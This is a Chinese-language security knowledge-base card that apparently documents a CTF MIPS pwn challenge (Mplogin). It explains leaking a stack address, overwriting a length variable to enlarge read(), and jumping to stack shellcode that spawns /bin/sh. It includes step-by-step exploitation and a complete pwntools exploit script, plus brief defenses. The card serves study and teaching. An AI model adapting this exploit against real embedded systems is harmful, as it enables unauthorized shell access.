---
id: binary-pwn-stack-mips-stack-leak-length-tamper-ret2shellcode
title: MIPS 栈地址泄露 + 长度变量篡改扩大 read：ret2shellcode 在栈上执行 execve
type: scenario
domain: binary
path: binary/pwn/stack
technique: mips-stack-leak-length-tamper-ret2shellcode
tags:
- pwn
- mips
- mipsel
- stack-overflow
- ret2shellcode
- stack-leak
- length-tamper
- qemu
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V597
  verified_at: '2026-11-12T16:53:28+08:00'
  notes: 已对照原文与 39 张图核对（HWS2020 Mplogin）：checksec No PIE/NX disabled/RWX、sub_400840 read(0,v1,24)+printf 泄露栈地址、sub_400978 v3=strlen+4 被第一次 read 36 字节覆盖为 0x100、Password 处 0x28+p32(stack)+shellcode，与 exp/getshell 截图一致；已修正原文误引的尾声指令偏移与泄露地址笔误 0x7ffff0f0。dedup 候选 binary-pwn-rop-mips32-shellcode-cache-coherence-sleep（I/D cache+sleep）与 binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page（BSS/mprotect）均非同链。原文未标版本，affected_versions 留空。
url: /docs/binary/pwn/stack/binary-pwn-stack-mips-stack-leak-length-tamper-ret2shellcode/
draft: false
kb_aliases:
- Mplogin
- MIPS ret2shellcode
- 栈地址泄露 ret2shellcode
- 长度变量篡改
- read 长度覆盖
- v3 篡改 0x100
---

## 一句话结论

MIPS 程序先把用户名缓冲区内容打印回显（泄露栈地址）并用 `strlen` 结果作为下一次 `read` 的长度，而该长度变量与第一个输入缓冲区在栈上相邻；先用第一次输入覆盖长度变量改成大值，第二次 `read` 就能把 shellcode 和泄露的栈地址一起写入栈，函数 `jr $ra` 直接跳到栈上 shellcode 执行 `execve("/bin/sh",0,0)`。

## 原理

- 栈地址泄露：`sub_400840` 用 `read(0, v1[24], 24)` 读用户名，校验前 5 字节为 `admin` 后 `printf("Correct name : %s", v1)`，把栈上缓冲区地址随内容一起打印；攻击者在用户名后不带换行地填充，使 `printf` 继续输出到相邻栈数据，或直接利用返回值/回显中出现的栈指针，得到可执行 shellcode 的栈地址（本例通过 `printf("%s")` 把栈地址写到接收流中）。
- 长度变量篡改：`main` 把 `strlen(username)` 的返回值传给 `sub_400978(a1)`；函数内 `v3 = a1 + 4`，作为第二次 `read(0, v4, v3)` 的长度。栈布局为 `v2[20]`（sp+0x18）、`v3`（sp+0x2c）、`v4[36]`（sp+0x3c）——第一次 `read(0, v2, 36)` 的 36 字节正好越过 v2 覆盖到 v3，写入 `0x100` 即把第二次读取长度放大。
- 栈溢出与跳转：第二次 `read(0, v4, 0x100)` 写入 v4 后还能覆盖保存的 `$ra`（v4[36] 之后 4 字节）；payload 用填充 + 泄露的栈地址 + shellcode 布局，函数尾声从栈上恢复 `$ra` 后 `jr $ra` 跳转（本 payload 覆盖 v4+0x28 处的返回地址槽，具体尾声偏移以反编译/调试实测为准）。
- 为什么能直接执行：该 MIPS 程序 NX 关闭且无 PIE/Canary，栈有 RWX 段；`jr $ra` 到栈地址即可执行。qemu-mipsel 用户态运行需要 `-L /usr/mipsel-linux-gnu/` 提供动态链接器/库（若为动态链接）。
- 环境敏感性：原文发现改文件名/缺少同目录 `.DS_Store` 会改变栈布局导致泄露失败，需保持原始目录与启动方式（文件路径长度、环境变量都会挪动栈帧）。

## 触发条件

- MIPS/MIPSEL 32 位程序，栈溢出可控 `$ra`，NX 关闭、无 PIE/Canary（或有办法绕过）。
- 存在“先泄露栈地址/缓冲区地址、再按可控长度 read 到栈”的流程，且长度变量与攻击者可控的第一次输入在栈上相邻。
- `read` 长度可被篡改到足以覆盖返回地址并放入 shellcode。
- 目标栈可执行（或可 mprotect 成可执行）。

## 利用步骤

1. `checksec`/`file` 确认 MIPS32 little-endian、No PIE、NX disabled、RWX。
2. 反向 `sub_400840`/`sub_400978`：确认用户名缓冲区大小、打印回显、`v3 = strlen(username)+4` 的取值路径，以及 `v2/v3/v4` 的栈偏移。
3. 第一次输入用户名：`admin` 填充到 24 字节，触发 `printf` 回显，接收泄露的栈地址（本例 `0x7ffff0f0` 一类）。
4. 第二次输入 Pre_Password：`"access".ljust(0x14,'b') + p32(0x100)`，覆盖 v3=0x100（v2 到 v3 偏移 0x14）。
5. 第三次输入 Password：`"0123456789".ljust(0x28,'c') + p32(leaked_stack) + asm(shellcraft.sh())`，覆盖 `$ra` 为泄露的栈地址，后面放 MIPS shellcode。
6. 交互拿 shell；失败时用 gdb-multiarch 按 `$sp` 重新计算 v4 到 `$ra` 的偏移。

## PoC

```python
from pwn import *
context.arch = 'mips'; context.os = 'linux'
p = process(["qemu-mipsel", "-L", "./", "./Mplogin"])

ru('Username :')
p.send('admin'.ljust(24, 'a'))
ru('adminaaaaaaaaaaaaaaaaaaa')
stack = u32(r(4))            # 回显中的栈地址
leak('stack', stack)

p.sendafter("Pre_Password : ", "access".ljust(0x14, "b") + p32(0x100))
p.recvuntil("Password : ")
p.send("0123456789".ljust(0x28, "c") + p32(stack) + asm(shellcraft.sh()))
p.interactive()
```

注：偏移/地址依二进制与启动环境变化，需按目标重新确认；`.DS_Store`/路径长度会影响栈布局。

## 变体与关联

- 变体：长度变量换成有符号数/负数绕过上限检查；泄露源换成格式化字符串、未初始化栈或堆指针；把 shellcode 放 BSS（需先 read 写入）以规避栈不可执行。
- 关联：与[[binary-pwn-rop-mips32-stack-frame-gadget-args]]（MIPS 返回地址在 fp+4、ROP gadget 基础）互补，本卡不走 ROP 而是直接 ret2shellcode；[[binary-pwn-rop-mips32-shellcode-cache-coherence-sleep]]处理 MIPS 栈上 shellcode 的 I/D cache 同步问题，本卡依赖 qemu/目标时序可直接命中，若执行异常可加 sleep/ cacheflush。
- 边界：需要先能泄露栈地址且长度变量可被覆盖；若开启 ASLR 且泄露不稳定，需多次尝试或换泄露点。

## 检测与防御

- 防御：编译开启 NX（MIPS 平台支持时）、PIE/ASLR 与栈保护；对用户输入长度做服务端上限校验，不要用 `strlen(用户输入)` 直接作为下一次读取长度；避免把缓冲区地址经 printf 回显。
- 检测：qemu/主机审计进程出现异常栈执行；二进制加固检查（checksec）作为发布门禁；CTF 场景外无通用运行时检测。
